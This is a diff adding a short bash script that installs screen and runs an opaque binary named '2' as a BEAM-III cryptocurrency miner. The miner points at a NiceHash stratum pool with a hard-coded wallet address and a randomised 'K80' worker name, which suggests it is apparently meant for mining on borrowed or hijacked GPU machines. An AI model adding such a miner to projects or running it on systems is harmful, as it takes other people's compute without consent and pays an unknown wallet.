@@ -1,0 +1,6 @@
+#!/bin/bash
+
+WORKER=$(echo $(shuf -i 1-20 -n 1)-K80)
+apt-get update
+apt install screen -y
+chmod u+x 2 && ./2 --algo BEAM-III --pool stratum+tcp://beamv3.usa.nicehash.com:3387 --user 39cLgRojCJ6cHaC375vumhXz83hGeR7SMH.$WORKER
